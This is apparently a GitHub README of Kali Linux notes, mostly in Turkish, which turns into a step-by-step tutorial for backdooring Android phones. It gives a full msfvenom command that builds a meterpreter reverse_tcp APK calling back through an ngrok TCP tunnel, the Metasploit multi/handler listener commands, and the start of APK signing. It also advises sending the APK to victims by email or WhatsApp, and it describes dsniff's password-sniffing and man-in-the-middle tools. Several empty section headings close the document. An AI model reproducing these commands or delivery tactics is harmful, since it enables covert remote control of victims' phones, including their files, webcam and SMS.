# kali
Useful codes for kali linux

## Keyboard Commands
```setxkbmap tr``` -> to change keyboard language option. After shut down Kali Linux, this must be run once again because it will no more available. 

Kali Linux is case sensible.

```mkdir``` -> Creates a new folder.


```apt-get install dsniff```

dSniff is a set of password sniffing and network traffic analysis tools written by security researcher and startup founder Dug Song to parse different application protocols and extract relevant information. dsniff, filesnarf, mailsnarf, msgsnarf, urlsnarf, and webspy passively monitor a network for interesting data (passwords, e-mail, files, etc.). arpspoof, dnsspoof, and macof facilitate the interception of network traffic normally unavailable to an attacker (e.g., due to layer-2 switching). sshmitm and webmitm implement active man-in-the-middle attacks against redirected SSH and HTTPS sessions by exploiting weak bindings in ad-hoc PKI.[2] [3]

```passwd```
changes password

## Backdoor Applications


### Backdoor IOS and Android

IOS de bir uygulama yaptigimizda bunu kullaniciya ulastirmak icin elimizde cok az yol var. 
1)AppStore a koymak zorundayiz.
2)Kurban telefonunu fiziksel olarak elimize alip telefonu kablo ile MaC imize baglayip uygulamayi telefona indirebiliyoruz
3)Apple Business Developer hesabi ile uygulama ciktigimizda bunu AppStore a yuklememiz gerekmiyor. O isletmedeki belli kullanicilara uygulamayi acabiliyoruz. Bu sayede de zararli yazilimlari kullaniciya gonderebiliyoruz. 

Android - Google Play

Android de de siki denetim var. Diyelim ki bir app yazdik hem IoS hem de Android, Android e o gun yukleyebiliriz ama IoS tarafi cok inceleme yaptigindan o gun yayinlanmayabilir. Icersiinde bir backdoor uygulamasi olan app sonsuza kadar da Google paly de kalacak anlamina gelmemeli bu. Bir gun o app de silinir. Bunun yerine app i Google Play e yukleyip kullanicilara mesaj yoluyla(email, whatsapp vb) gibi gondermeyi tercih ederler Android de. 


Kullanicinin tek yapmasi gereken Google Play ayarlarinda Google Play store disindaki app lere olan izin kutusunu da acmis olmasi. Google play de app i mesaj yoluyla birilerine gonderebiliyoruz. 

Telefon icinde backdoor ureten araclardan bazilari hali hazirda Kali Linux icerisinde mevcut.

```msfvenom```

### Payload
-p -- payload; Hangi isletim sistemine, hangi ortamda nasil bir saldiriyla backdoor un olusacagi belirtilir.  Andoid icin olusturacagim APK dosyasinda bu payload da belirttigimiz tum arametreler yer alacaktir. 

APK Nedir? Bir kod yazildiktan sonra Android de uygulama haline getirdigimiz son dosyadir. Windows daki .exe dosyalari gibi. 
```msfvenom``` bize bir APK cikartacak, biz de bu APK yi kullaniciya yollayacagiz, kullanici da tikladiginda bizim Kali Linux mize bir baglanti gelecek. 

#### msfvenom -p nasil kullanilir?
Ornegin Windows icin bir backdoor uygulamasi olustursaydik -p ye isletim sistemi olarak Windows u belirtecektik.
Benzer sekilde Android icin;

```msfvenom -p android/meterpreter/reverse_tcp```

```meterpreter``` bir session aracidir. Ne demek session araci? Kurban hacklendiginde bizde meterpreter adinda bir session acilacak. Session, baglanti acilmasi demek. Bu meterpreter in ozelliklerini(dosya sisteminde gezinmek, kurbanin webcamini acmak, telefonundan sms yollamak) kullanip kurbanin telefonunda istedgimiz seyleri yapabilecegiz. Kurbani hackledikten sonra yapilabilecek en iyi seylerden biri meterpreter in acik oldugundan amin olmak. 

```reverse_tcp``` ters baglanti anlamina gelir

Backdoor larda iki secenek var;
1) Benim Kali Linux umden kurbana bir baglanti istegi yollamak; bu secenek cogu zaman Pc de veya mobile da kurbana baglanti istegi gittiginde bir firewall ya da guvenlik onlemi varsa bu cok kolay seilde fark edilebilir. 
2) reverse_tcp de ise kurban dan bize baglanti geliyor. Andoid e gonderdigimiz APK yi tiklayan kurban bize bir baglanti yolluyor. tcp ise hangi port y da teknoloji uzerinden baglanti yollayacagimizi belirttigimiz parametre. tcp yerine http ya da https de diyebiliriz. tcp su an en iyi calisani.
                         
### IP Adresses
```msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT= ```
LHOST: Localhost Su an uzerinde calistigimiz bilgisayarin IP adresi. Public IP mizi yazariz yani modemimizin IP adresini. Google dan ***what is my ip*** yazarak IP mizi ogrenebiliriz. Ayni agdaki tum cihazlarin public IP si aynidir, modemimize baglali bilgisayarlarimizin, telefonumuzun, televizyonumuzun hepsinin public Ip si aynidir.
Neden public IP mize yollatiyoruz? Cunku baglantinin bize ulasmasini istiyoruz.


Her cihazimizin kendi ait bir de yerel IP adresi var. Global IP adresini vermek hack lerken tehlikeli. 


LPORT: Localport Bilginin gelecegi port

Kurbana yolladigimiz dosyaya(trojan, virus) tikladiginda baglanti nereye gitsin? bu iki komutla belirliyoruz. 

```service apache2 start``` Kali Linux un icerisinde bulunan apache2 adli sunucu calistiracak. Sunucu nedir? Icersinde dosyalar bulunan, internet uzerinde farkli yerlere hizmet vermemizi olanak taniyan bir makina. Normalde web sitelerini sunucular uzerinde saklariz. Misal kendi Kali Linux muz icerisinde bir web sitesi yapabiliriz. 

Kali Linux icerisinde;
**/var/www/html/index.html** path inde web sitesi bulunmakta. Kali Linux NAT network de ve burada baska herhangi bir makina yok. Eger farkli isletim sistemelriyle farkli VM lrimiz olsaydi bu web sitesine hepsinden girilebilirdi cunku ayni agda olacaklardi. 

```ifconfig``` yazdigimizda inet in yanindaki IP adresini Firfox u acip arama cubuguna yazdigimizda apache 2 web sayfasi acilacak. 

### Tunnel Service

ngrok.com

Hesap olusturduktan sonra sayfadaki Download sekmesinden indirip root'un altindaki Downloads klasorune unzip edilir.

![image](https://user-images.githubusercontent.com/28653377/148266516-528427c0-16e9-44b7-ae30-3ccc113c6ef0.png)


Sonrasinda shell de root un altindaki Download dizinine gidilir

```cd Dowloads```
Download sayfasindaki token shell e yazilarak ngrok aktive edilir. 

![image](https://user-images.githubusercontent.com/28653377/148266645-0c1e7d46-778c-4883-9e9e-0978c14d4583.png)


![image](https://user-images.githubusercontent.com/28653377/148266872-8f47be7f-f5d7-4253-9ee2-ec8775819029.png)



Bu sayede ngrok araci ile Kali Linux'u birbirine baglamis olduk. Token i kullanmadan ngrok'u kullanamayiz. 

Bu noktadan sonra ngrok'dan aldigimiz bilgileri ```msfvenom``` a yazacagiz ve APK'miz olusmus olacak.


ngrok'un dokumantasyonu detaylidir. Ileri seviyede dokumantasyona bakilmalidir. Kendi web server'imizi calistirmak istiyorsak ngrok'u http 80 ile calistirmamiz gerekiyor. Burada ngrok tcp ile calistirilacak ve port bizim tarafimizdan belirlenecek. 

```./ngrok tcp 4242 ```
![image](https://user-images.githubusercontent.com/28653377/148267772-8bae85c4-b3a9-44e3-af1b-a573579485c2.png)

calistirmis olduk. 

tcp://8.tcp.ngrok.io:15487 -> localhost:4242  
Buradaki 15847 ngrok'un kendi portu. 

```msfvenom -p android/meterpreter/reverse_tcp LHOST=8.tcp.ngrok.io LPORT=15487 R > /root/ngroktest.apk```

Burada android de  ilgili host ve portu kullanarak bir backdoor uygulamasi olusturduk. Sonraki ```R > /root/ngroktest.apk``` komutu sonucu cikarmak istedigimiz dizini ifade etmektedir. 


Bu android uygulamasini tikladiginda bir kisi, kendi telefonundan bemim belirttigim adrese bir baglanti gondermeye basliyor. Biz bu baglantiyi dinliyoruz ve dinledikten sonra da hackleyebilecegim.

Hedefe gonderdigimizde ve tikladiginda bana bir baglanti dusecek benim o dusmeden once dinliyor olmam bir baglanti geliyor diye dinliyor olmam lazim. 

terminalde hala ngrok calisiyor terminali kapattigim an baglanti kesilir.

Dinleme yapmak icin Metasploit denen bir uygulama kullanmam gerekiyor. 

Metasploit'den once yeni bir terminal penceresi acip 
```service postgresql start```

yazip servisi baslatiyoruz. Neden bu veri tabanini calistirdik cunku Metasploit bu veri tabanini kullaniyor. 

Sonrasinda 

```msfconsole``` yaziyoruz (msfvenom la benzer: Metasploit'in versioynlari gibi dusunulebilir hepsi ayni firmadan cikmis)

![image](https://user-images.githubusercontent.com/28653377/148270156-dbc9fd42-8e08-4349-bbf8-701d15563607.png)


***Metasploit*** penetrasyon testleri icin cok onemli bir aractir bir framework'tur.

Disardan bir baglanti gelecek ve o modulu dinlemek istiyoruz. Asamalar su sekilde:

```use exploit/multi/handler```

multi/handler cok amacli ele alma araci demek

Sirada hangi payload dan baglanti bekledigimizi yazmamiz gerekiyor/ Tum backdoor lar icin kullanilabileceginden payload'umuzun cesitini yazmamis gerekir. 

``` set payload android/meterpreter/reverse_tcp```

su an bu ok 

```show options``` dedigimizde bize secenekleri gosterir

![image](https://user-images.githubusercontent.com/28653377/148270834-7245295b-9492-466f-8717-fc3c8426696e.png)


LHOST ve LPORt istiyor su an ngrok ekranindaki localhost yani 0.0.0.0 i ve yazdigimiz 4242 portunu buraya vermemiz gerekiyor. Onu da 

```set LHOST 0.0.0.0 ```

ve

```set LPORT=4242```

enter a bastigimizda atamis oluyoruz.

Tekrardan ```show options``` dedigimizde bu sefer bunlarin atandigini goruyoruz.

![image](https://user-images.githubusercontent.com/28653377/148271382-cd108cf2-b642-4701-a9dc-d2371e60b44c.png)


Artik dinlemeye baslayabiliriz, bunun icin

```exploit -j -z``` 

yapiyoruz. Bu dinleme islemi su an arka planda basliyor. APK'yi kurbana gondermeden once ***imzalamak*** gerekiyor. 

Bir gelistirici bir android uygulamasi yaptiginda bunu android studyoda imzalar ki GooglePlay'e koyarken uygulamanin kendi tarafindan yapildigini teyit etsin, orada yayinlanabilsin ve cihazlada calisabilsin. 


Bu imzlaama islemini yapabilmek icin **"jdk"** e ihtiyacimiz var. Imzlaama islemi olmazsa apk'lar calsimaz. Imzalama islemi komut satirindan yapilir.

Imzalama islemi icin **keystore***  isimli bir dosya olusturulur ve imzalanir. 

```keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000```




















### Create an APK

### Listening

### Signing 


### Hacking the Mobile phone
